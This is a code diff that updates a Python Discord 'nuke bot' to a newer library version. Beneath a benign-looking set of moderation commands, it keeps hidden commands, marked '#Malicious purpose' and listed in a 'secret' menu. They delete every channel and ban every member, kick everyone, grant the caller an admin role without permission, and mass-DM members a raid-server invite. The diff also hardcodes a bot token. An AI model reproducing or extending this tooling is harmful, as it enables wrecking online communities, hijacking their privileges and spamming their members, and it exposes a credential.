@@ -1,4 +1,4 @@
-# nuke bot by MEDMEX#1337/MaxDaKing
+# nuke bot by MEDMEX#7945/MaxDaKing
 
 import discord
 from discord.ext import commands
@@ -22,7 +22,7 @@ async def on_server_join(server):
 
 @client.command(pass_context=True)
 async def help(ctx):
-    author = ctx.message.author
+    member = ctx.message.author
 
     embed = discord.Embed(
         colour = discord.Colour.blue()
@@ -35,112 +35,127 @@ async def help(ctx):
     embed.add_field(name='$info', value='Gives information of a user', inline=False)
     embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
     embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
-    await client.send_message(author, embed=embed)
+    await member.send(embed=embed)
 
 @client.command(pass_context=True)
-async def dm(ctx, message):
-    server = ctx.message.server
-    for member in server.members:
+async def dm(ctx):
+    guild = ctx.message.guild
+    for member in guild.members:
      await asyncio.sleep(0)
      try:
-       await client.send_message(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
+       await member.send("https://discord.gg/9KNQqRU Join the server to join us in future raids.")
        print("Sent message")
      except:
        pass
 
 @client.command(pass_context=True)
 async def clear(ctx, amount=10):
+    member = ctx.message.author
     channel = ctx.message.channel
     messages = []
-    async for message in client.logs_from(channel, limit=int(amount)):
+    async for message in channel.history(limit=int(amount)):
         messages.append(message)
-    await client.delete_messages(messages)
-    await client.say('Messages deleted')
+    await channel.delete_messages(messages)
+    await channel.send('Messages deleted')
 
 @client.command(pass_context=True)
 async def ping(ctx):
 	channel = ctx.message.channel
 	t1 = time.perf_counter()
-	await client.send_typing(channel)
+	await channel.trigger_typing()
 	t2 = time.perf_counter()
 	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
-	await client.say(embed=embed)
+	await channel.send(embed=embed)
 
 @client.command(pass_context=True)
-async def info(ctx, user: discord.Member=None):
-    if user is None:
-        await client.say('Please input a user.')
+async def info(ctx, member: discord.Member=None):
+    channel = ctx.message.channel
+    if member is None:
+        await channel.send('Please input a user.')
     else:
-        await client.say("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))
+        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
 
 @client.command(pass_context=True)
-async def kick(ctx, user: discord.Member=None):
+async def kick(ctx, member: discord.Member=None):
     author = ctx.message.author
-    if author.server_permissions.kick_members:
-        if user is None:
-            await client.say('Please input a user.')
+    channel = ctx.message.channel
+    if author.guild_permissions.kick_members:
+        if member is None:
+            await channel.send('Please input a user.')
         else:
-            await client.say (":boot: Get kicked **{}**, Damn kid".format(user.name))
-            await client.kick(user)
+            await channel.send(":boot: Get kicked **{}**, Damn kid".format(member.name))
+            await member.kick()
     else:
-        await client.say('You lack permission to preform this action')
+        await channel.send('You lack permission to perform this action')
 
 @client.command(pass_context=True)
-async def ban(ctx, user: discord.Member=None):
+async def ban(ctx, member: discord.Member=None):
     author = ctx.message.author
-    if author.server_permissions.kick_members:
-        if user is None:
-            await client.say('Please input a user.')
+    channel = ctx.message.channel
+    if author.guild_permissions.kick_members:
+        if member is None:
+            await channel.send('Please input a user.')
         else:
-            await client.say("Get banned **{}**, Damn kid".format(user.name))
-            await client.ban(user)
+            await channel.send("Get banned **{}**, Damn kid".format(member.name))
+            await member.ban()
     else:
-        await client.say('You lack permission to preform this action')
+        await channel.send('You lack permission to perform this action')
 
 
 @client.command(pass_context=True)
 async def invite(ctx):
-    await client.say("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")
+    channel = ctx.message.channel
+    await channel.send("https://discordapp.com/oauth2/authorize?client_id=503182818667659274&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Fauthorize%3Fclient_id%3D503182818667659274%26redirect_uri%3DMedbot%26response_type%3Dcode%26scope%3Didentify&scope=bot")
 
 #Malicious purpose
+@client.command(pass_context=True)
+async def secret(ctx):
+    member = ctx.message.author
+    embed = discord.Embed(
+        colour = discord.Colour.blue()
+    )
+
+    embed.set_author(name='secret')
+    embed.add_field(name='$rape', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
+    embed.add_field(name='$h', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
+    embed.add_field(name='$dab', value='Gives you admin access (bot needs administrator)', inline=False)
+    embed.add_field(name='$dm', value='Sends an invite link of the raid hub to everybody in the server', inline=False)
+    await member.send(embed=embed)
 
 @client.command(pass_context=True)
 async def h(ctx):
-        for user in list(ctx.message.server.members):
+        for member in list(ctx.message.guild.members):
             try:
-                await client.kick(user)
-                print ("User " + user.name + " has been kicked from " + ctx.message.server.name)
+                await guild.kick(member)
+                print ("User " + member.name + " has been kicked from ")
             except:
                 pass
         print ("Action Completed: kall")
 
 @client.command(pass_context=True)
 async def rape(ctx):
-        for channel in list(ctx.message.server.channels):
+        for channel in list(ctx.message.guild.channels):
+            await channel.delete()
+            print (channel.name + " has been deleted")
+        guild = ctx.message.guild
+        channel = await guild.create_text_channel( 'RIP')
+        await channel.send( "Now that's alot of damage!!")
+        for member in list(ctx.message.guild.members):
             try:
-                await client.delete_channel(channel)
-                print (channel.name + " has been deleted in " + ctx.message.server.name)
-            except:
-                pass
-        server = ctx.message.server
-        channel = await client.create_channel(server, 'RIP', type=discord.ChannelType.text)
-        await client.send_message(channel, "Now that's alot of damage!!")
-        for user in list(ctx.message.server.members):
-            try:
-                await client.ban(user)
-                print ("User " + user.name + " has been banned from " + ctx.message.server.name)
+                await guild.ban(member)
+                print ("User " + member.name + " has been banned")
             except:
                 pass
         print ("Now that's alot of damage")
 
 @client.command(pass_context=True)
 async def dab(ctx):
-    server = ctx.message.server
+    guild = ctx.message.guild
     perms = discord.Permissions(8)
-    await client.create_role(server, name='dab', permissions=perms)
-    user = ctx.message.author
-    role = discord.utils.get(user.server.roles, name="dab")
-    await client.add_roles(user, role)
+    await guild.create_role(name='dab', permissions=perms)
+    member = ctx.message.author
+    role = discord.utils.get(guild.roles, name="dab")
+    await member.add_roles(role)
     print ("You're in buddy, now don't fuck it up")
 
-client.run("")
+client.run("NTAzMTgyODE4NjY3NjU5Mjc0.XV0QwA.BAgIQO1mVg0z7p93cOgHsbLN1kM")
